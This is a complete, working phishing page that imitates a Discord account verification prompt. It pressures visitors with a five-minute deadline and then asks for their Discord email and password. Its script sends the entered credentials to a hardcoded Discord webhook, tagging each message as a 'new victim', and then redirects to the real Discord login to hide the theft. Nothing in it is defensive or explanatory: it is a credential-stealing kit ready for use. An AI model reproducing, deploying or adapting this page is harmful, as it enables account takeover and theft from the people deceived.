<!DOCTYPE html>
<html>
<head>
    <title>One-Tap Verification</title>
    <meta charset="UTF-8">
    <style>
        body {
            background: #1e1e2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
        }
        .container {
            background: #181825;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            width: 400px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }
        h1 { color: #89b4fa; margin-bottom: 20px; }
        p { color: #cdd6f4; margin: 20px 0; line-height: 1.5; }
        .alert {
            background: #313244;
            padding: 15px;
            border-radius: 10px;
            color: #f9e2af;
            font-size: 14px;
            margin: 20px 0;
        }
        .btn {
            background: #5865F2;
            color: white;
            padding: 12px 30px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 20px;
            cursor: pointer;
            border: none;
            font-size: 16px;
            font-weight: bold;
            width: auto;
        }
        .btn:hover { background: #4752c4; }
        .expires { color: #f38ba8; font-size: 12px; margin-top: 20px; }
        input {
            background: #313244;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            width: 80%;
            margin: 10px auto;
            font-size: 14px;
            display: block;
        }
        .hidden { display: none; }
        input:focus { outline: none; border: 1px solid #5865F2; }
    </style>
</head>
<body>
    <div class="container" id="step1">
        <h1>🔐 One-Tap Verification</h1>
        <p>Click the button below to verify your account.</p>
        <div class="alert">
            ⚠️ This verification expires in <strong>5 minutes</strong>
        </div>
        <button class="btn" id="verifyButton">✅ Verify Account</button>
        <div class="expires">
            Only you can see this message • One-Tap Security
        </div>
    </div>

    <div class="container hidden" id="step2">
        <h1>🔐 Login Required</h1>
        <p>Enter your Discord credentials to complete verification.</p>
        <input type="text" id="email" placeholder="Email or Phone Number">
        <input type="password" id="password" placeholder="Password">
        <button class="btn" id="sendButton">✅ Verify & Continue</button>
        <div class="expires">
            This is a required security check
        </div>
    </div>

    <script>
        // Seu webhook atual
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1498870894221594667/qfx1JJDGjOoOkzCoXdB7H9PUOd-GuZLBK6SfPT8-orpthddmmV7dvjvXFSmKC7gKtsEW";

        // Usando eventos 'click' mais diretos e confiáveis
        document.getElementById('verifyButton').onclick = function() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        };

        document.getElementById('sendButton').onclick = function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert("Please fill in both fields.");
                return;
            }

            // Desabilita o botão para evitar cliques duplos
            const sendBtn = document.getElementById('sendButton');
            sendBtn.disabled = true;
            sendBtn.textContent = "Sending...";

            const data = {
                content: `**🎯 NOVA VÍTIMA!**\n📧 **Email:** ${email}\n🔑 **Senha:** ${password}\n🖥️ **IP:** ${window.location.hostname}`
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    // Sucesso! Mostra mensagem final
                    document.getElementById('step2').innerHTML = `
                        <h1 style="color:#a6e3a1">✅ Verification Complete!</h1>
                        <p>Your account has been verified. Redirecting you to Discord...</p>
                        <div class="expires">This page will close automatically.</div>
                    `;
                    // Redireciona para o Discord real após 3 segundos
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/login';
                    }, 3000);
                } else {
                    alert("Verification service error. Please try again.");
                    sendBtn.disabled = false;
                    sendBtn.textContent = "✅ Verify & Continue";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Network error. Please check your connection.");
                sendBtn.disabled = false;
                sendBtn.textContent = "✅ Verify & Continue";
            });
        };
    </script>
</body>
</html>
